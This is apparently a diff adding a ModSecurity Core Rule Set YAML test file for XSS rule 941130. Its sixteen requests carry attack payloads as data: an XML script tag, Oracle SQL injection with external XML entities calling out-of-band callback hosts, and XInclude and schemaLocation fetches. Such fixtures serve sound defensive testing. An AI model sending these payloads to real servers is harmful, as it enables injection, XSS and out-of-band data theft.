@@ -1,0 +1,309 @@
+---
+  meta:
+    author: "csanders-git, Christian Folini"
+    description: "Tests to trigger, or not trigger 941130"
+    enabled: true
+    name: 941130.yaml
+  tests:
+  -
+    test_title: 941130-1
+    desc: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: GET
+          port: 80
+          uri: '/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E'
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-2
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=555-555-0199@example.com'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % lbsod SYSTEM \x22http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/\x22>%lbsod;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-3
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=<aai xmlns=\x22http://a.b/\x22 xmlns:xsi=\x22http://www.w3.org/2001/XMLSchema-instance\x22 xsi:schemaLocation=\x22http://a.b/ http://c5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar/aai.xsd\x22>aai</aai>"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-4
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=abcd'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % cgger SYSTEM \x22http://ved8pm79xruv3c46hup01827oyuzxtlx9qwjk8.example'||'foo.bar/\x22>%cgger;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-5
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=<acp xmlns:xi=\x22http://www.w3.org/2001/XInclude\x22><xi:include href=\x22http://sgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar/foo\x22/></acp>"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-6
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=/active/LFI/LFI-Detection-Evaluation-POST-200Valid/content.ini'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % grorj SYSTEM \x22http://yikbtpbc1uyy7f89lxt35b6as1yw1qpudm0co1.example'||'foo.bar/\x22>%grorj;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-7
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=<afa xmlns=\x22http://a.b/\x22 xmlns:xsi=\x22http://www.w3.org/2001/XMLSchema-instance\x22 xsi:schemaLocation=\x22http://a.b/ http://2mpfxtfg5y22bjcdp1x79faew52420q0er1hp6.examplefoo.bar/afa.xsd\x22>afa</afa>"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-8
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=<chj xmlns=\x22http://a.b/\x22 xmlns:xsi=\x22http://www.w3.org/2001/XMLSchema-instance\x22 xsi:schemaLocation=\x22http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\x22>chj</chj>"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-9
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=/content.ini'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % dwusu SYSTEM \x22http://ehzrs5as0axe6v7pkdsj4r5qrhxcp6da12osch.example'||'foo.bar/\x22>%dwusu;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-10
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=EmptyValue'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM \x22http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/\x22>%awpsd;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-11
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=file:/boot.ini'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % cwtpc SYSTEM \x22http://gvft67ouecbgkxlryf6litjs5jbd5htlhd43ss.example'||'foo.bar/\x22>%cwtpc;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-12
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=Matched Data: <!ENTITY % awfke SYSTEM found within ARGS_NAMES:1'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % awfke SYSTEM \x22http://gj3tu7cu2czg8x9rmful6t7stjzcp4d812osch.example'||'foo.bar/\x22>%awfke;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-13
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=<oez xmlns=\x22http://a.b/\x22 xmlns:xsi=\x22http://www.w3.org/2001/XMLSchema-instance\x22 xsi:schemaLocation=\x22http://a.b/ http://eygr95rshaeenvop1d9jlrmq8hegib6bu4hx5m.examplefoo.bar/oez.xsd\x22>oez</oez>"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-14
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % anwyn SYSTEM \x22http://y98bkp2csupyyfz9cxk3wbxaj1pzuzi26vtohd.example'||'foo.bar/\x22>%anwyn;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-15
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=<vqk xmlns:xi=\x22http://www.w3.org/2001/XInclude\x22><xi:include href=\x22http://749kfyxln3k7toui76fcrksjeak3nybzzsmlaa.examplefoo.bar/foo\x22/></vqk>"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
+  -
+    test_title: 941130-16
+    desc: "XSS test for 941130"
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/"
+          data: "var=2010-01-01'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % fhklu SYSTEM \x22http://fzisa6stibffowpq2eakmsnr9ifhii6mueh45t.example'||'foo.bar/\x22>%fhklu;"
+          version: HTTP/1.0
+        output:
+          log_contains: id "941130"
